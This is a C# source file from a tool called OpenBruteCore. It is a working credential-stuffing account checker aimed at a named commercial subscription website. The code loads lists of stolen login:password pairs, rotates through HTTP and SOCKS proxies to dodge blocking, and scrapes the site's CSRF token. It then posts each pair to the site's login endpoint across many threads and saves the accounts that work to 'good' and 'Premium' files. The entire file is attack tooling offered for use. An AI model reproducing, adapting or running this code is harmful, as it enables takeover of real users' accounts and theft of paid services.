using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OpenBruteCore
{
    public class allMechanic
    {
        
        public static object accLock = new object();
        private static object resultLock = new object();
        
        private static object checkLock = new object();
        public static void loadSource()
        {
            try
            {

                var FileDialog = new OpenFileDialog(); FileDialog.Filter = "Source (*.txt)|*.txt";
                FileDialog.Multiselect = true;
                if (FileDialog.ShowDialog() == DialogResult.OK)
                {
                    globalList.sourceList.Clear();
                    foreach (String file in FileDialog.FileNames)
                    {
                        globalList.sourceList.AddRange(File.ReadAllLines(file));
                    }
                    globalList.frm.lbSource.Text = globalList.sourceList.Count.ToString();
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error with loading source file !", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void loadProxy()
        {
            try
            {
                var FileDialog = new OpenFileDialog(); FileDialog.Filter = "Proxy (*.txt)|*.txt";
                if (FileDialog.ShowDialog() == DialogResult.OK)
                {
                    globalList.proxyList.Clear();
                    globalList.proxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
                    globalList.frm.lbProxy.Text = globalList.proxyList.Count.ToString();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error with loading proxy file !", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void RefreshProxy()
        {
            using (var req = new HttpRequest())
            {
                try
                {
                    req.AllowAutoRedirect = false;
                    string list = req.Get(globalList.proxyUrl).ToString();
                    string[] Proxies = list.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    globalList.proxyList.Clear();
                    foreach (string value in Proxies)
                    {
                        globalList.proxyList.Add(value.Trim());
                    }
                }
                catch
                {
                    RefreshProxy();
                }

            }
        }

        public static void startWork()
        {
            if (globalList.proxyList.Count == 0)
            {
                MessageBox.Show("Proxy list is clear! Load proxies!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (globalList.sourceList.Count == 0)
            {
                MessageBox.Show("Source list is clear! Load source!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                globalList.worck = true;
                Thread th;
                globalList.threadList.Clear();
                for (int thrcount = 0; thrcount < globalList.thCount; thrcount++)
                {

                    th = new Thread(mainWorcher);
                    th.IsBackground = false;
                    th.Priority = ThreadPriority.Highest;
                    globalList.threadList.Add(th);
                    th.Start();
                }

            }
            

        }



        private static void mainWorcher()
        {
            while (globalList.worck)
            {
                try
                {
                    string acc = string.Empty;
                    string login = string.Empty;
                    string pass = string.Empty;
                    lock (allMechanic.accLock)
                    {
                        if (globalList.sourceList.Count > 0)
                        {
                            acc = globalList.sourceList[0];
                            globalList.sourceList.RemoveAt(0);
                        }
                        else
                        {
                            break;
                        }
                        if (string.IsNullOrEmpty(acc))
                        {
                            Thread.Sleep(900);
                            continue;
                        }
                        if (acc.Contains(";"))
                        {
                            login = acc.Split(';')[0];
                            pass = acc.Split(';')[1];
                        }
                        if (acc.Contains(":"))
                        {
                            login = acc.Split(':')[0];
                            pass = acc.Split(':')[1];
                        }

                    }
                    Checker(login, pass);
                }
                catch
                {
                    continue;
                }
            }

        }



        private static void DataResult(string result, string acc)
        {
            string file = "";
            lock (resultLock)
            {
                if (result == "goodbal")
                {
                    file = Path.Combine(globalList.folderName, "Premium.txt");
                    if (!Directory.Exists(globalList.folderName))
                        Directory.CreateDirectory(globalList.folderName);
                    File.AppendAllText(file, acc + "\r\n");
                    globalList.good++;
                }
                if (result == "good")
                {
                    file = Path.Combine(globalList.folderName, "good.txt");
                    if (!Directory.Exists(globalList.folderName))
                        Directory.CreateDirectory(globalList.folderName);
                    File.AppendAllText(file, acc + "\r\n");
                    globalList.good++;
                }
                if (result == "bad")
                {
                    globalList.bad++;
                }
                if (result == "error")
                {
                    globalList.sourceList.Add(acc);
                    globalList.error++;
                }
                if (result == "projecterror")
                {
                    file = Path.Combine(globalList.folderName, "projectError.txt");
                    if (!Directory.Exists(globalList.folderName))
                        Directory.CreateDirectory(globalList.folderName);
                    File.AppendAllText(file, acc + "\r\n");
                    globalList.projecterror++;
                }
                if (result == "corerror")
                {
                    file = Path.Combine(globalList.folderName, "coreError.txt");
                    if (!Directory.Exists(globalList.folderName))
                        Directory.CreateDirectory(globalList.folderName);
                    File.AppendAllText(file, acc + "\r\n");
                    globalList.corerror++;
                }

            }
        }

        public static void Checker(string login, string pass) {
            
                using (var request = new HttpRequest())
                {
                    try
                    {


                        string ip = Class.Helper.GetProxy();

                        request.Cookies = new CookieStorage();
                        if (globalList.proxyType == "HTTPS")
                            request.Proxy = HttpProxyClient.Parse(ip);
                        if (globalList.proxyType == "SOCKS4")
                            request.Proxy = Socks4ProxyClient.Parse(ip);
                        if (globalList.proxyType == "SOCKS5")
                            request.Proxy = Socks5ProxyClient.Parse(ip);

                        request.UserAgent = Http.ChromeUserAgent();


                        //CSRF
                        string token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
                        Match match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
                        string csrf = match.Success ? match.Groups[1].Value : "Не найдено";




                        request.SslProtocols = SslProtocols.Tls | SslProtocols.Tls12 | SslProtocols.Tls11;
                        request.AllowAutoRedirect = false;
                        request.ConnectTimeout = globalList.timeOut;
                        request.AddHeader("X-Requested-With", "XMLHttpRequest");
                        request.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                        request.KeepAlive = true;


                        string PostData = "username=" + login + "&password=" + pass + "&token=" + csrf + "&redirect=&from=pc_premium_login&segment=straight";

                        //string json = "{\"username\":\""+login+"\",\"password\":\""+pass+"\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}";
                        string content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData, "application/x-www-form-urlencoded").ToString();

                        //metroTextBox2.Text = content;

                        if (content.Contains("success\":\"0"))
                        {
                            DataResult("bad", login + ":" + pass);
                        }
                        else if (content.Contains("success\":\"1"))
                        {
                           DataResult("good", "+++++++++++++++++\r\n" + login + ":" + pass + "\r\n+++++++++++++++++\r\n");
                        }
                        else if (content.Contains("<html><head><script type=\"text/javascript\">"))
                        {
                            DataResult("bad", login + ":" + pass);
                        }
                        else
                        {
                            DataResult("projecterror", login + ":" + pass + "{" + request.Response.ToString() + "}");
                        }

                    }
                    catch (HttpException)
                    {
                        DataResult("error", login + ":" + pass);
                    }

                    catch (Exception ex)
                    {

                        DataResult("corerror", login + ":" + pass + "{" + ex.Message + "}");
                        // MessageBox.Show(ex.ToString());
                    }
                    finally
                    {

                        request?.Dispose();
                    }
                }
            
        }


        public static void stopWork()
        {
            globalList.workStatus = "nothing";
            foreach (Thread thread in globalList.threadList)
            {
                thread.Abort();
            }

        }
    }
}
